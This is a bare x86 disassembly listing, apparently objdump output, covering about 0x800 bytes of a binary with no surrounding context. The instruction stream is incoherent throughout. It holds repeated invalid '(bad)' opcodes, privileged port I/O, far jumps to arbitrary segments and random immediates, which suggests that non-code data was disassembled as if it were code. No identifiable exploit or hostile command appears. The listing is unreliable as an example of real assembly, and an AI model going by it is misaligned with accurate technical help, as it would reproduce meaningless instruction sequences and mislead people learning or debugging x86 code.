  49e893:	dec    esp
  49e894:	mov    dh,ah
  49e896:	nop
  49e897:	(bad)  
  49e898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e899:	loopne 0x49e860
  49e89b:	xchg   esp,eax
  49e89c:	xchg   ecx,eax
  49e89d:	add    DWORD PTR [edi-0x1d4a4820],ebp
  49e8a3:	ins    DWORD PTR es:[edi],dx
  49e8a4:	sar    BYTE PTR [eax+0x30],cl
  49e8a7:	add    al,0x4c
  49e8a9:	push   ecx
  49e8aa:	jbe    0x49e8ab
  49e8ac:	ret    0x9d86
  49e8af:	test   eax,0x51159ab1
  49e8b4:	lods   al,BYTE PTR ds:[esi]
  49e8b5:	lock mov ch,ch
  49e8b8:	popa   
  49e8b9:	fldenv [ebp-0x2dd90728]
  49e8bf:	jge    0x49e88d
  49e8c1:	sbb    ebp,DWORD PTR [eax]
  49e8c3:	lods   eax,DWORD PTR ds:[esi]
  49e8c4:	fs loop 0x49e84b
  49e8c7:	and    BYTE PTR [ebx+ebx*1+0x671aa696],bh
  49e8ce:	in     al,dx
  49e8cf:	sub    al,0xdc
  49e8d1:	sub    ch,BYTE PTR [ebp+0x33]
  49e8d4:	test   al,0x38
  49e8d6:	add    eax,0x30117576
  49e8db:	in     al,dx
  49e8dc:	lock or esp,0x36
  49e8e0:	sbb    al,0x2a
  49e8e2:	xchg   ebp,eax
  49e8e3:	adc    esp,0xbe90624
  49e8e9:	jo     0x49e90f
  49e8eb:	sar    BYTE PTR [ebx],cl
  49e8ed:	dec    ebp
  49e8ee:	fdiv   DWORD PTR [ebp+0xb]
  49e8f1:	ret    0x7ee9
  49e8f4:	add    DWORD PTR [ecx],eax
  49e8f6:	pop    esi
  49e8f7:	test   al,0x2
  49e8f9:	jne    0x49e913
  49e8fb:	ins    BYTE PTR es:[edi],dx
  49e8fc:	mov    edx,0x25568141
  49e901:	mov    al,BYTE PTR [eax+0x1]
  49e904:	(bad)  
  49e905:	jb     0x49e88a
  49e907:	das    
  49e908:	xchg   edi,eax
  49e909:	mov    ch,0x9a
  49e90b:	xor    dh,BYTE PTR [ebp-0x14]
  49e90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49e90f:	pop    DWORD PTR [esi+0x13]
  49e912:	xchg   BYTE PTR ds:0x167c36a1,cl
  49e918:	or     al,0x23
  49e91a:	jmp    0xdbcf:0xa8e6820f
  49e921:	inc    esp
  49e922:	out    0x82,eax
  49e924:	cmp    eax,DWORD PTR es:[esi]
  49e927:	mov    BYTE PTR [edx+0x17],dh
  49e92a:	push   edx
  49e92b:	cwde   
  49e92c:	lods   al,BYTE PTR ds:[esi]
  49e92d:	push   esi
  49e92e:	cmp    eax,0xd417ff01
  49e933:	mov    ds:0x8b28787e,al
  49e938:	sbb    BYTE PTR [ecx+0x168bc455],cl
  49e93e:	or     DWORD PTR [eax],0xf
  49e941:	lods   eax,DWORD PTR ds:[esi]
  49e942:	fadd   st(0),st
  49e944:	and    BYTE PTR [esp+ecx*1],cl
  49e947:	push   esi
  49e948:	(bad)  
  49e949:	adc    edi,DWORD PTR [esi+0x36]
  49e94c:	mov    ds:0x7a7404b0,al
  49e951:	xchg   BYTE PTR [esi-0x48],bl
  49e954:	mov    al,ds:0x4211d98c
  49e959:	sub    dh,BYTE PTR [ebx]
  49e95b:	add    al,0x54
  49e95d:	into   
  49e95e:	pop    edx
  49e95f:	add    DWORD PTR [edx+0x7a899f66],eax
  49e965:	mov    ah,BYTE PTR [ecx+0x60c1283e]
  49e96b:	lds    eax,FWORD PTR [ebx+0x6a56e3e6]
  49e971:	and    esi,0x1e0b08d0
  49e977:	into   
  49e978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49e979:	call   0x18a67876
  49e97e:	dec    ebx
  49e97f:	push   ss
  49e980:	fidiv  WORD PTR [ebx-0xf3ddf7e]
  49e986:	and    BYTE PTR [eax+0x48],al
  49e989:	rcl    cl,0x10
  49e98c:	mov    ah,0x26
  49e98e:	and    BYTE PTR [esi+edx*2+0x7df3ca08],bh
  49e995:	sub    BYTE PTR [eax+0x78],0x57
  49e999:	rcl    DWORD PTR [edi],1
  49e99b:	mov    bh,0xe0
  49e99d:	cmp    al,0x98
  49e99f:	mov    BYTE PTR [edx+0x1c],dl
  49e9a2:	adc    al,0x1d
  49e9a4:	pop    edx
  49e9a5:	add    eax,0xcf59a40a
  49e9aa:	in     al,0x8
  49e9ac:	aaa    
  49e9ad:	push   cs
  49e9ae:	or     bl,BYTE PTR [edi+0x10]
  49e9b1:	adc    DWORD PTR [esi+0x50],0xffffffdf
  49e9b5:	cmc    
  49e9b6:	dec    ecx
  49e9b7:	add    ebx,ebx
  49e9b9:	pop    ds
  49e9ba:	or     eax,0x7ab4f7fe
  49e9bf:	mov    BYTE PTR [ebx],al
  49e9c1:	shl    BYTE PTR [ecx],0x28
  49e9c4:	pop    es
  49e9c5:	mov    dl,0xd7
  49e9c7:	pop    edi
  49e9c8:	mov    eax,0x8007000e
  49e9cd:	mov    bl,BYTE PTR gs:0x667791d8
  49e9d4:	ins    DWORD PTR es:[edi],dx
  49e9d5:	xor    al,0x58
  49e9d7:	mov    BYTE PTR [edx],bh
  49e9d9:	call   0x715b:0xad043954
  49e9e0:	test   DWORD PTR [ebx-0x2bd8e59e],0x43c0cb70
  49e9ea:	out    dx,eax
  49e9eb:	ret    0x20
  49e9ee:	lea    edx,[ecx-0x2b5f48e0]
  49e9f4:	push   esp
  49e9f5:	cmp    dl,BYTE PTR ds:0xb1f80040
  49e9fb:	mov    eax,0xf256d0b3
  49ea00:	loop   0x49ea3f
  49ea02:	in     al,0xb3
  49ea04:	arpl   WORD PTR [eax+edi*2],cx
  49ea07:	adc    al,0x72
  49ea09:	aam    0xc4
  49ea0b:	mov    bl,0x79
  49ea0d:	in     al,0x5b
  49ea0f:	leave  
  49ea10:	push   ebx
  49ea11:	add    eax,DWORD PTR [edx]
  49ea13:	xchg   esi,eax
  49ea14:	xor    ecx,eax
  49ea16:	ret    0x9215
  49ea19:	and    edi,edx
  49ea1b:	fist   WORD PTR [esp+ebx*1]
  49ea1e:	add    al,0xa4
  49ea20:	les    eax,FWORD PTR [edi-0x15f8d958]
  49ea26:	sbb    bl,BYTE PTR ds:0x53f251dc
  49ea2c:	rol    DWORD PTR [eax-0x39f15bd6],0x4f
  49ea33:	mov    DWORD PTR [eax],eax
  49ea35:	sahf   
  49ea36:	leave  
  49ea37:	mov    eax,0x9eb81616
  49ea3c:	push   ecx
  49ea3d:	sbb    BYTE PTR [eax+0x54],ah
  49ea40:	mov    eax,0xb66b81e1
  49ea45:	push   eax
  49ea46:	loopne 0x49ea49
  49ea48:	xor    ch,BYTE PTR [esp+ecx*8+0x4c]
  49ea4c:	cli    
  49ea4d:	and    BYTE PTR [edx],0xc
  49ea50:	pushf  
  49ea51:	cmp    al,0xf
  49ea53:	pushf  
  49ea54:	inc    ebp
  49ea55:	or     ch,BYTE PTR [ebp+0xad20953]
  49ea5b:	(bad)  
  49ea5c:	adc    edx,edx
  49ea5e:	fsubr  DWORD PTR ds:0x4ebabea5
  49ea64:	or     BYTE PTR [esi-0x7c],bl
  49ea67:	add    cl,ch
  49ea69:	adc    edx,DWORD PTR [eax]
  49ea6b:	jle    0x49eae7
  49ea6d:	pop    eax
  49ea6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ea6f:	ror    DWORD PTR [eax+0x6282b120],1
  49ea75:	jnp    0x49ea7c
  49ea77:	sbb    eax,0x31c22ac
  49ea7c:	jp     0x49eaaa
  49ea7e:	sbb    DWORD PTR [esi],eax
  49ea80:	out    dx,al
  49ea81:	jnp    0x49ea6b
  49ea83:	add    DWORD PTR [esi],eax
  49ea85:	add    DWORD PTR [ebp+ecx*2+0x58e2a0ec],edx
  49ea8c:	jg     0x49ea89
  49ea8e:	neg    BYTE PTR [esi+0xc]
  49ea91:	sub    esp,DWORD PTR [eax]
  49ea93:	dec    esi
  49ea94:	add    al,0x2b
  49ea96:	pop    esi
  49ea97:	add    al,0x40
  49ea99:	push   0x16
  49ea9b:	inc    ebx
  49ea9c:	cwde   
  49ea9d:	add    ah,dl
  49ea9f:	push   eax
  49eaa0:	outs   dx,BYTE PTR ds:[esi]
  49eaa1:	cmp    al,0xcd
  49eaa3:	ins    BYTE PTR es:[edi],dx
  49eaa4:	add    ebx,esp
  49eaa6:	add    edi,eax
  49eaa8:	push   ecx
  49eaa9:	push   edi
  49eaaa:	bound  esp,QWORD PTR [eax]
  49eaac:	in     al,dx
  49eaad:	and    BYTE PTR [edx],dl
  49eaaf:	inc    ebp
  49eab0:	cmp    BYTE PTR [edi-0xf076590],0xee
  49eab7:	clc    
  49eab8:	push   edx
  49eab9:	push   edi
  49eaba:	adc    edi,DWORD PTR [eax]
  49eabc:	aam    0x8f
  49eabe:	jmp    0x49ea4a
  49eac0:	push   ebp
  49eac1:	call   FWORD PTR [eax]
  49eac3:	retf   
  49eac4:	popf   
  49eac5:	or     DWORD PTR [edx],0x19fee490
  49eacb:	repnz or eax,0x14ef5056
  49ead1:	fsub   DWORD PTR [eax]
  49ead3:	add    eax,0x6603eb68
  49ead8:	pop    esi
  49ead9:	inc    esp
  49eada:	mov    eax,ds:0x8982dc9
  49eadf:	mov    al,0x76
  49eae1:	or     bl,ch
  49eae3:	adc    ebx,DWORD PTR [eax-0x7a]
  49eae6:	sub    ebx,DWORD PTR [esp+esi*1]
  49eae9:	push   ebx
  49eaea:	ins    BYTE PTR es:[edi],dx
  49eaeb:	adc    BYTE PTR [edx],bh
  49eaed:	into   
  49eaee:	cli    
  49eaef:	outs   dx,DWORD PTR ds:[esi]
  49eaf0:	mov    esi,DWORD PTR [esi]
  49eaf2:	sub    al,0x64
  49eaf4:	int3   
  49eaf5:	push   es
  49eaf6:	add    DWORD PTR [bx],edx
  49eaf9:	call   0x5ad7:0x6e0ea9f4
  49eb00:	scas   eax,DWORD PTR es:[edi]
  49eb01:	push   ebx
  49eb02:	cmp    bl,bl
  49eb04:	clc    
  49eb05:	in     eax,0x75
  49eb07:	clc    
  49eb08:	lods   al,BYTE PTR ds:[esi]
  49eb09:	imul   ebp,DWORD PTR [edx-0x341f7136],0xffffffc6
  49eb10:	or     al,ah
  49eb12:	pop    edx
  49eb13:	jp     0x49eb15
  49eb15:	jmp    0xbcea2c2c
  49eb1a:	sub    BYTE PTR [ebx+0x32],dh
  49eb1d:	aad    0xd3
  49eb1f:	jno    0x49eae1
  49eb21:	jnp    0x49eaad
  49eb23:	pop    edx
  49eb24:	out    0x6b,eax
  49eb26:	xor    eax,0xfc8dcc0c
  49eb2b:	and    BYTE PTR [eax],ch
  49eb2d:	inc    esp
  49eb2e:	mov    eax,ds:0x861440aa
  49eb33:	add    al,bh
  49eb35:	ins    BYTE PTR es:[edi],dx
  49eb36:	dec    edx
  49eb37:	mov    ecx,0x535079dd
  49eb3c:	jne    0x49eba0
  49eb3e:	dec    ebx
  49eb3f:	add    al,0x2a
  49eb41:	or     al,BYTE PTR [ebx]
  49eb43:	push   ss
  49eb44:	int3   
  49eb45:	mov    ds:0xd67beb3c,eax
  49eb4a:	push   esi
  49eb4b:	(bad)  
  49eb4d:	or     BYTE PTR [ecx],ah
  49eb4f:	jmp    0xf0c0:0xc04ee8f4
  49eb56:	mov    bh,0x85
  49eb58:	fistp  DWORD PTR [ebx-0x68]
  49eb5b:	data16 (bad) [ecx+0x1f]
  49eb5f:	adc    bh,ah
  49eb61:	or     BYTE PTR [edx+0x8],cl
  49eb64:	xor    eax,0xcd677e31
  49eb69:	mov    bh,bh
  49eb6b:	push   es
  49eb6c:	bound  ecx,QWORD PTR [ebx-0x2950f029]
  49eb72:	add    edx,edx
  49eb74:	add    esi,esi
  49eb76:	loopne 0x49eb84
  49eb78:	lea    edx,[ebp+0x3cd832e8]
  49eb7e:	mov    ecx,0x750e8e12
  49eb83:	pop    eax
  49eb84:	adc    al,0xa6
  49eb86:	mov    eax,ds:0x6e5c027a
  49eb8b:	xchg   ebx,eax
  49eb8c:	jno    0x49eb94
  49eb8e:	mov    eax,ds:0x60c6f733
  49eb94:	cmp    ebp,DWORD PTR [ebp+0x60]
  49eb97:	jg     0x49ebcc
  49eb99:	add    al,0xb5
  49eb9b:	call   0x2f4a34bb
  49eba0:	cmp    DWORD PTR ds:0xd231ca03,ebp
  49eba6:	jge    0x49ec03
  49eba8:	dec    ebx
  49eba9:	pop    ecx
  49ebaa:	fdivr  QWORD PTR [ebx]
  49ebac:	retf   
  49ebad:	jb     0x49ebb7
  49ebaf:	add    ebp,DWORD PTR [edx+0xae3b8dd]
  49ebb5:	repnz cmp edi,DWORD PTR [eax+0x72]
  49ebb9:	mov    ds:0xaf144af7,eax
  49ebbe:	adc    DWORD PTR [eax+0x7104dbb0],ebx
  49ebc4:	out    dx,al
  49ebc5:	dec    ebx
  49ebc6:	mov    eax,edi
  49ebc8:	add    eax,0xaa1e514d
  49ebcd:	sub    eax,0xc4d80d33
  49ebd2:	mov    al,ds:0xdacf20b3
  49ebd7:	push   esi
  49ebd8:	lock add eax,0xc903cb52
  49ebde:	add    ebx,ebx
  49ebe0:	dec    eax
  49ebe1:	mov    edx,0x14f63308
  49ebe6:	mov    eax,0x11c21058
  49ebeb:	dec    edi
  49ebec:	or     BYTE PTR ds:0x64a6e04f,cl
  49ebf2:	ret    0x73d7
  49ebf5:	jl     0x49ebc5
  49ebf7:	test   al,0x10
  49ebf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ebfa:	test   eax,0x15aecc20
  49ebff:	rcr    DWORD PTR [edx-0x25],1
  49ec02:	jne    0x49ec43
  49ec04:	aaa    
  49ec05:	mov    esp,0xf003010a
  49ec0a:	bndldx bnd1,ds:0xbb0ad103
  49ec11:	add    BYTE PTR es:[edx+0x3b],bl
  49ec15:	enter  0xca72,0xc4
  49ec19:	push   ebp
  49ec1a:	jge    0x49eb9f
  49ec1c:	ins    DWORD PTR es:[edi],dx
  49ec1d:	sbb    al,0x5f
  49ec1f:	inc    ecx
  49ec20:	rcl    BYTE PTR [eax],0x3
  49ec23:	add    dl,BYTE PTR [edx+esi*2]
  49ec26:	into   
  49ec27:	fs push ecx
  49ec29:	xor    cl,BYTE PTR [eax+edx*4]
  49ec2c:	add    al,0xec
  49ec2e:	sbb    cl,BYTE PTR [esp+ebx*8+0x2b]
  49ec32:	sub    ebx,edi
  49ec34:	mov    ecx,DWORD PTR [eax+eax*8-0x288f9be4]
  49ec3b:	int3   
  49ec3c:	ret    0xde21
  49ec3f:	and    bh,al
  49ec41:	repz push ebx
  49ec43:	xchg   esp,eax
  49ec44:	cmp    eax,0xc068baf1
  49ec49:	jge    0x49ec1f
  49ec4b:	jb     0x49ec52
  49ec4d:	sub    eax,0xdea020d
  49ec52:	rcl    esi,0xdc
  49ec55:	push   0xffffffca
  49ec57:	shl    ecx,0xca
  49ec5a:	inc    edx
  49ec5b:	(bad)  
  49ec5c:	pop    edi
  49ec5d:	jb     0x49ec81
  49ec5f:	sbb    bl,BYTE PTR [edi+0x23]
  49ec62:	(bad)  
  49ec63:	stc    
  49ec64:	inc    ecx
  49ec65:	push   es
  49ec66:	and    BYTE PTR [esi],al
  49ec68:	xchg   DWORD PTR [edi],ebp
  49ec6a:	jecxz  0x49ec70
  49ec6c:	push   es
  49ec6d:	(bad)  
  49ec6f:	enter  0xeaae,0x20
  49ec73:	sbb    BYTE PTR [ebp+0x8],al
  49ec76:	out    0x33,eax
  49ec78:	cs pcmpeqd mm1,mm1
  49ec7c:	dec    edx
  49ec7d:	ret    0xa801
  49ec80:	(bad)  
  49ec81:	mov    eax,0x6e82986d
  49ec86:	and    DWORD PTR [eax],eax
  49ec88:	lds    ecx,FWORD PTR [eax+0x23]
  49ec8b:	ret    0xa81a
  49ec8e:	and    dl,dh
  49ec90:	retf   0x3104
  49ec93:	out    0x14,al
  49ec95:	aad    0xdd
  49ec97:	mov    ecx,0xdb8057e
  49ec9c:	mov    dh,cl
  49ec9e:	jae    0x49ed1f
  49eca0:	out    dx,eax
  49eca1:	inc    ebp
  49eca2:	jmp    0x184ce31
  49eca7:	jb     0x49ecb9
  49eca9:	push   eax
  49ecaa:	cmp    al,BYTE PTR [edx]
  49ecac:	ja     0x49ecb7
  49ecae:	xchg   ebx,eax
  49ecaf:	stos   DWORD PTR es:[edi],eax
  49ecb0:	push   esi
  49ecb1:	cvtps2pi mm4,QWORD PTR ds:0xf20cc833
  49ecb8:	mov    ds:0x48f6005e,al
  49ecbd:	add    eax,0xf69019e1
  49ecc2:	inc    ecx
  49ecc3:	hlt    
  49ecc4:	pop    es
  49ecc5:	cmp    al,0x34
  49ecc7:	or     BYTE PTR [ebx],al
  49ecc9:	xchg   ecx,eax
  49ecca:	fmul   DWORD PTR [ecx]
  49eccc:	in     al,0x2
  49ecce:	add    DWORD PTR [ecx+0x2f],edx
  49ecd1:	dec    esi
  49ecd2:	add    DWORD PTR [edx],ecx
  49ecd4:	cmp    edi,edi
  49ecd6:	jno    0x49ed1e
  49ecd8:	push   edi
  49ecd9:	test   ebp,edx
  49ecdb:	or     DWORD PTR ds:0x2465e32e,eax
  49ece1:	mov    ds:0xc02a6300,al
  49ece6:	pop    eax
  49ece7:	adc    edi,DWORD PTR [edi+0x5660a096]
  49eced:	add    cl,BYTE PTR [ebx+edx*2+0x4]
  49ecf1:	nop
  49ecf2:	jge    0x49ed56
  49ecf4:	adc    eax,0xf123e561
  49ecf9:	or     cl,BYTE PTR cs:[eax+edi*4+0x27]
  49ecfe:	mov    bh,0x1
  49ed00:	jbe    0x49ed0b
  49ed02:	or     BYTE PTR [eax-0x7c77dd0],cl
  49ed08:	or     dl,BYTE PTR [eax]
  49ed0a:	mov    ecx,0x6314576
  49ed0f:	icebp  
  49ed10:	fimul  DWORD PTR [edi]
  49ed12:	mov    al,0x70
  49ed14:	movsx  esp,WORD PTR [esi]
  49ed17:	dec    eax
  49ed18:	je     0x49ed78
  49ed1a:	add    al,0x54
  49ed1c:	adc    BYTE PTR [ecx+0x5],al
  49ed1f:	sub    dl,0x78
  49ed22:	or     BYTE PTR ds:0xd2469a90,0xe0
  49ed29:	es push esp
  49ed2b:	or     al,dl
  49ed2d:	add    DWORD PTR [edx+0x31bf7040],edx
  49ed33:	and    al,0xd1
  49ed35:	dec    eax
  49ed36:	(bad)  
  49ed37:	and    ebx,edx
  49ed39:	cld    
  49ed3a:	mov    eax,0x10a6567
  49ed3f:	(bad)  
  49ed40:	js     0x49ed39
  49ed42:	push   esp
  49ed43:	jo     0x49ed27
  49ed45:	add    eax,0x20394e68
  49ed4a:	push   esi
  49ed4b:	setne  bl
  49ed4e:	xlat   BYTE PTR ds:[ebx]
  49ed4f:	outs   dx,DWORD PTR ds:[esi]
  49ed50:	mul    DWORD PTR [eax]
  49ed52:	test   DWORD PTR [edx],ecx
  49ed54:	retf   
  49ed55:	mov    al,0x1
  49ed57:	or     eax,0x53d06c64
  49ed5c:	mov    ds:0x9c4b12c7,al
  49ed61:	mov    bh,0xb9
  49ed63:	scas   al,BYTE PTR es:[edi]
  49ed64:	je     0x49edba
  49ed66:	rol    BYTE PTR [edx-0x18],0x3e
  49ed6a:	push   0x9d50200a
  49ed6f:	shl    DWORD PTR [edi],0x54
  49ed72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ed73:	in     al,dx
  49ed74:	add    al,0xef
  49ed76:	adc    dl,BYTE PTR [esi-0x69]
  49ed79:	cmp    al,BYTE PTR [ebx+0x38ff5093]
  49ed7f:	ret    0xd080
  49ed82:	not    BYTE PTR [ecx]
  49ed84:	mov    DWORD PTR [edx+0x2],ebx
  49ed87:	dec    BYTE PTR [esi+0x6c]
  49ed8a:	jne    0x49ed40
  49ed8c:	clc    
  49ed8d:	je     0x49edd1
  49ed8f:	cmp    ebx,eax
  49ed91:	jbe    0x49edd1
  49ed93:	push   ss
  49ed94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ed95:	loopne 0x49ed30
  49ed97:	inc    ecx
  49ed98:	sub    al,0xf8
  49ed9a:	pop    ebp
  49ed9b:	hlt    
  49ed9c:	or     al,0x7
  49ed9e:	scas   al,BYTE PTR es:[edi]
  49ed9f:	lods   eax,DWORD PTR ds:[esi]
  49eda0:	push   ss
  49eda1:	and    ebx,DWORD PTR [ebp-0x75]
  49eda4:	inc    esp
  49eda5:	mov    ah,BYTE PTR [ebp+eiz*1+0x384ed690]
  49edac:	pop    ss
  49edad:	inc    esi
  49edae:	jne    0x49ed31
  49edb0:	inc    ecx
  49edb1:	pop    ss
  49edb2:	and    bl,BYTE PTR [esi+0x46]
  49edb5:	jg     0x49ed98
  49edb7:	es mov ch,0x8d
  49edba:	repnz adc eax,0x11c5d855
  49edc0:	mov    WORD PTR [edx],es
  49edc2:	push   ecx
  49edc3:	sub    edx,DWORD PTR [esi*1-0x29d670c]
  49edca:	adc    al,0xe2
  49edcc:	cmp    cl,BYTE PTR [ecx]
  49edce:	ficom  WORD PTR [esp+ecx*8]
  49edd1:	cld    
  49edd2:	xchg   DWORD PTR [ebx-0x68119444],ebx
  49edd8:	or     ecx,DWORD PTR [ebx+0x11]
  49eddb:	inc    edx
  49eddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49eddd:	push   es
  49edde:	test   DWORD PTR [ebx],ecx
  49ede0:	mov    dh,0x34
  49ede2:	inc    esp
  49ede3:	add    al,0xa
  49ede5:	mov    bl,0x6
  49ede7:	jb     0x49ee2c
  49ede9:	and    edx,DWORD PTR [esi]
  49edeb:	icebp  
  49edec:	out    dx,al
  49eded:	mov    eax,ds:0x4efb380e
  49edf2:	pop    ss
  49edf3:	mov    al,ds:0xc2208b6e
  49edf8:	cmp    eax,0xf556449e
  49edfd:	data16 aam 0x87
  49ee00:	mov    BYTE PTR [ecx-0x27],dl
  49ee03:	jle    0x49ed95
  49ee05:	adc    dl,bh
  49ee07:	add    BYTE PTR [ebx+esi*1-0x3f3bc558],0x12
  49ee0f:	jp     0x49ee04
  49ee11:	or     esp,ecx
  49ee13:	add    al,BYTE PTR [esi]
  49ee15:	add    BYTE PTR [ecx],0x90
  49ee18:	iret   
  49ee19:	adc    dl,al
  49ee1b:	test   BYTE PTR [eax],0x8c
  49ee1e:	sbb    esp,DWORD PTR [esi]
  49ee20:	sbb    al,0x43
  49ee22:	xor    eax,0xd5d5b829
  49ee27:	(bad)  
  49ee29:	mov    DWORD PTR [ebx-0x12a3b12e],edx
  49ee2f:	pop    edx
  49ee30:	inc    edi
  49ee31:	inc    eax
  49ee32:	popa   
  49ee33:	rol    DWORD PTR [edx-0x5e],0xf4
  49ee37:	rcl    DWORD PTR [edi-0x63dd3999],1
  49ee3d:	inc    ebp
  49ee3e:	dec    ebx
  49ee3f:	mov    al,ds:0xa5f122fa
  49ee44:	cmp    BYTE PTR ds:0x3e3521d8,bh
  49ee4a:	mov    esi,0x53164a86
  49ee4f:	xor    bl,bl
  49ee51:	sbb    al,0xf0
  49ee53:	xchg   edx,eax
  49ee54:	inc    ebx
  49ee55:	(bad)  
  49ee57:	mov    ds:0x4aac9c66,al
  49ee5c:	xor    bl,BYTE PTR [esp+edx*4]
  49ee5f:	in     al,dx
  49ee60:	jl     0x49eea8
  49ee62:	in     eax,dx
  49ee63:	scas   al,BYTE PTR es:[edi]
  49ee64:	xchg   edx,eax
  49ee65:	xor    BYTE PTR [edi+0x302a603d],bh
  49ee6b:	or     esi,esp
  49ee6d:	dec    ebx
  49ee6e:	call   0x4c4c:0x8d2750ab
  49ee75:	jecxz  0x49ee7f
  49ee77:	scas   eax,DWORD PTR es:[edi]
  49ee78:	push   edx
  49ee79:	aam    0xa2
  49ee7b:	or     edx,eax
  49ee7d:	adc    BYTE PTR [esi+0x18],dl
  49ee80:	sbb    al,0x70
  49ee83:	ret    0x4550
  49ee86:	rcr    BYTE PTR [eax+0x11230122],1
  49ee8c:	pop    edi
  49ee8d:	sub    al,0xb3
  49ee8f:	add    DWORD PTR [ebx+0x0],esi
  49ee92:	mov    edi,0xa9220d45
  49ee97:	popf   
  49ee98:	mov    cl,0x8b
  49ee9a:	clc    
  49ee9b:	xor    eax,0xff14dcb4
  49eea0:	(bad)  
  49eea1:	cmp    BYTE PTR [edx+0x75],0x1d
  49eea5:	jno    0x49eebe
  49eea7:	dec    esi
  49eea8:	shl    BYTE PTR [edx-0x51cdb751],0xe3
  49eeaf:	pusha  
  49eeb0:	in     al,dx
  49eeb1:	stos   BYTE PTR es:[edi],al
  49eeb2:	and    ebx,DWORD PTR [eax+edx*1]
  49eeb5:	xchg   edx,eax
  49eeb6:	sub    dl,dh
  49eeb8:	mov    edx,0x480c0191
  49eebd:	mov    edi,0x3e1d8b74
  49eec2:	clc    
  49eec3:	loopne 0x49eed6
  49eec5:	test   BYTE PTR ds:[eax+edx*1-0x5bcea88c],0x7c
  49eece:	leave  
  49eecf:	add    al,0x67
  49eed1:	inc    edx
  49eed2:	inc    ecx
  49eed3:	pop    ebp
  49eed4:	push   ecx
  49eed5:	add    al,BYTE PTR [edi-0x4ad48f96]
  49eedb:	push   edx
  49eedc:	fs adc al,0x6
  49eedf:	push   esp
  49eee0:	mov    ds:0x5159a16b,eax
  49eee5:	sbb    BYTE PTR [esi-0x7b],0xf6
  49eee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49eeea:	cdq    
  49eeeb:	or     al,BYTE PTR [edx-0x5c94dad4]
  49eef1:	sbb    eax,0x6546c0f2
  49eef6:	push   edi
  49eef7:	xchg   edx,eax
  49eef8:	adc    al,0xd6
  49eefa:	cmp    DWORD PTR [esi+0x299a811b],ecx
  49ef00:	sbb    ah,BYTE PTR [ebp-0x6dbf6df0]
  49ef06:	push   0xa4e0c4dc
  49ef0b:	mov    esp,0xcc7f241c
  49ef10:	xchg   edi,eax
  49ef11:	nop
  49ef12:	popf   
  49ef13:	mov    al,ds:0x8cf5d8ba
  49ef18:	stc    
  49ef19:	pop    esp
  49ef1a:	shl    DWORD PTR [edx-0x7a95f6f9],0x3d
  49ef21:	dec    edx
  49ef22:	clc    
  49ef23:	std    
  49ef24:	add    ah,bl
  49ef26:	daa    
  49ef27:	mov    eax,0x51ad1068
  49ef2c:	and    dl,BYTE PTR [edi+0x3e21958d]
  49ef32:	nop
  49ef33:	xor    eax,0xecda77b8
  49ef38:	mov    esp,0x74fcf67d
  49ef3d:	sub    ah,bl
  49ef3f:	and    al,0x26
  49ef41:	adc    eax,0xa743af4
  49ef46:	pusha  
  49ef47:	lahf   
  49ef48:	mov    eax,ds:0x6a2f6f44
  49ef4d:	loop   0x49ef86
  49ef4f:	daa    
  49ef50:	ds push edx
  49ef52:	dec    eax
  49ef53:	lock or eax,0x42104538
  49ef59:	(bad)  
  49ef5a:	push   esi
  49ef5b:	push   ecx
  49ef5c:	add    ebx,DWORD PTR [ebx+0x3]
  49ef5f:	xchg   DWORD PTR [eax],esp
  49ef61:	add    bl,BYTE PTR [ebp-0x1a747657]
  49ef67:	inc    eax
  49ef68:	push   ebx
  49ef69:	xlat   BYTE PTR ds:[ebx]
  49ef6a:	ins    BYTE PTR es:[edi],dx
  49ef6b:	mov    ds:0x271a0b70,al
  49ef70:	adc    al,0x4
  49ef72:	loopne 0x49ef6b
  49ef74:	mov    eax,fs
  49ef76:	mov    esi,0x1447cded
  49ef7b:	aas    
  49ef7c:	mov    dl,0x95
  49ef7e:	jmp    0x13ae:0xb858b22
  49ef85:	dec    edx
  49ef86:	jo     0x49f007
  49ef88:	dec    ebx
  49ef89:	push   eax
  49ef8a:	lock and bh,BYTE PTR [edx-0x6dfc88fc]
  49ef91:	push   edx
  49ef92:	mov    DWORD PTR [ebp+0x7aa0f867],0x58d9c047
  49ef9c:	test   esp,ebp
  49ef9e:	sub    esp,DWORD PTR [ebx+0x60]
  49efa1:	pop    esi
  49efa2:	int    0x94
  49efa4:	xchg   BYTE PTR [eax+0x10d90c48],bl
  49efaa:	jns    0x49eff1
  49efac:	addr16 xor dh,dl
  49efaf:	sbb    cl,BYTE PTR [edx]
  49efb1:	push   edx
  49efb2:	push   eax
  49efb3:	in     al,0xa3
  49efb5:	lds    ecx,FWORD PTR [edx+0x50738def]
  49efbb:	pusha  
  49efbc:	add    BYTE PTR [ecx],cl
  49efbe:	xlat   BYTE PTR ds:[ebx]
  49efbf:	xchg   esp,eax
  49efc0:	sbb    al,0x64
  49efc2:	cmp    ah,bl
  49efc4:	inc    esp
  49efc5:	push   esi
  49efc6:	call   0xef3e2e1a
  49efcb:	test   DWORD PTR [edx+0x5b33c6eb],ebp
  49efd1:	das    
  49efd2:	and    BYTE PTR [esi+ebx*2],ah
  49efd5:	aad    0xa7
  49efd7:	pop    DWORD PTR [ebx+0x78b0480c]
  49efdd:	and    cl,dh
  49efdf:	shr    BYTE PTR [esi+0x12],1
  49efe2:	mov    bl,BYTE PTR [ecx-0x27fbc50b]
  49efe8:	addr16 mov esp,0x65038693
  49efee:	popa   
  49efef:	jl     0x49f01e
  49eff1:	fisttp QWORD PTR [edi-0x46]
  49eff4:	(bad)  
  49eff5:	push   ecx
  49eff6:	and    edi,edi
  49eff8:	or     eax,0x35a61e24
  49effd:	adc    BYTE PTR [eax+0x58317009],dh
  49f003:	jne    0x49f00f
  49f005:	xchg   ebx,eax
  49f006:	out    0x12,al
  49f008:	aam    0xa2
  49f00a:	sub    eax,ebx
  49f00c:	mov    esi,0x4b66094
  49f011:	popa   
  49f012:	ficomp WORD PTR [eax+0x41bd9a74]
  49f018:	or     BYTE PTR [edi-0x51e0a916],bh
  49f01e:	rcl    BYTE PTR [ecx+edi*2],0x1
  49f022:	lds    edx,FWORD PTR [eax+0x37]
